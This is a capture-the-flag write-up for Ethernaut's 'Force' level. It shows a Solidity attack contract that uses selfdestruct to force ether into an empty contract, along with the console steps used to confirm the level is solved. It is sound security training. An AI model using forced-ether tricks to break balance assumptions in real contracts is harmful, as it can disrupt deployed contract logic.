<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel7.svg">

## Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Challenge's message.

> Some contracts will simply not take your money ¯\_(ツ)_/¯
The goal of this level is to make the balance of the contract greater than zero.

Our aim should be send ether to target contract to solve this challenge.

## Subverting

My attack contract.

```solidity
pragma solidity ^0.8.0;

import './Force.sol';

contract Attack{

    Force force;

    constructor(address _target) {
        force = Force(_target);
    }

    function attack() external payable{
        address payable target = payable(address(force));
        selfdestruct(target);
    }
}
```

In the starting point, identify the contart address which is our target. Afterwards, send ether to target contract with ```selfdestruct()``` method. With help of selfdestruct, contracts can be deleted from the blockchain and selfdestruct **sends all remaining ether stored in the contract** to a designated address. For this reason,
a malicious contract can use **selfdestruct** to force sending Ether to any contract.

Learn target contract's address.

```shell
await instance
'0x2C5eB5feC2C02C4bAba25DfD9e9E9092967Bde51'
```
Deploy and call attack function.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Force/img/deploy.png">

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Force/img/transaction.png">


Check instance's balance. Solved the challenge.

```shell
await getBalance(instance)
'0.00000000000000010'
```

Ethernaut's message.

>In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.
However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

**_by wasny0ps_**
